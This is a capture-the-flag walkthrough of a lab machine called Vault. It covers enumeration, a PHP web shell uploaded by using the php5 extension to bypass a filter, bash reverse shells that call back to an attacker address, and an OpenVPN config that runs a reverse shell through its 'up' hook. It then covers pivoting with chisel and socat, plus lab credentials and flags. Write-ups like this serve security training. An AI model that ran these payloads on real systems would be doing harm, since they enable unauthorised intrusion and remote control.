# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/vault 10.10.10.109

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a69d0f7d7375bba8940ab7e3fe1f24f4 (RSA)
|   256 2c7c34eb3aeb0403ac48285409743d27 (ECDSA)
|_  256 98425fad8722926d72e6666c82c10983 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80
Talks about a new client called sparklays. There is a directory with this name so gobuster time.
```
gobuster dir -u http://10.10.10.109/sparklays/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

Find a few pages:
```
admin.php
login.php
design/
```

Doing that again on design shows an uploads and design.html page.

# File Upload
```
<?php system($_REQUEST['cmd']); ?>
```

php extensions are blocked :( but php5 is not.

so throw a shell that way:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1'
```

# Shell as www-data

Dave has some cool files:
```
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
itscominghome
dave
Dav3therav3123
```

# Shell as dave
chisel time!
```
(local) ./chisel server --reverse --socks5 -p 8000
(remote) ./chisel clietn 10.10.14.21:8000 R:socks
```

then run nmap via proxychains:
```
proxychains -sT nmap 192.168.122.4

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

# DNS Server
port 80 lets you test ovpn config.

There is an rce for this:
```
remote 192.168.122.1
nobind
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.122.1/9002 0>&1'"
```

Now we are root on DNS.

You can also forward the port to make it reach back to kali
```
ssh> -R 127.0.0.1:9001:127.0.0.1:9001
```

or socat (linux only :( )
```
(remote) ./socat TCP-LISTEN:9002,bin=192.168.122.1,fork,reuseaddr TCP:localhost:9001

#POC
(local) nc -lvnp 9001
(remote) nc 192.168.122.1 9002
# You should see traffic on local box
```


user.txt (in dave's home dir)
```
a4947faa8d4e1f80771d34234bd88c73
```

More notes:
```
ssh
dave
dav3gerous567
```

check /etc/hosts
```
192.168.5.2	Vault
```

Cant ping the box :(
```
ip route
192.168.5.0/24 via 192.168.122.5 dev ens3 
192.168.122.0/24 dev ens3  proto kernel  scope link  src 192.168.122.4 
```

IPV6 magic:
```
arp -an
? (192.168.122.5) at 52:54:00:3a:3b:d5 [ether] on ens3
? (192.168.122.1) at fe:54:00:17:ab:49 [ether] on ens3

nmap -6 fe:54:00:17:ab:49%ens3

#shows that 987 is open
```

Guess on ssh

```
ping6 -I ens3 ff02::1
ssh -p 987 fe80::5054:ff:fec6:7066%ens3
```

yep

# Dave on vault
root.txt.gpg file but we are stuck in rbash

the key is on the ubuntu box.

drop back to DNS and scp.
```
scp -6 -P 987 dave@[fe80::5054:ff:fec6:7066%ens3]:root* .
```

now base64 encode and drop on the ubuntu box.

decode with the vault password from ages ago.

root.txt:
```
ca468370b91d1f5906e31093d9bfe819
```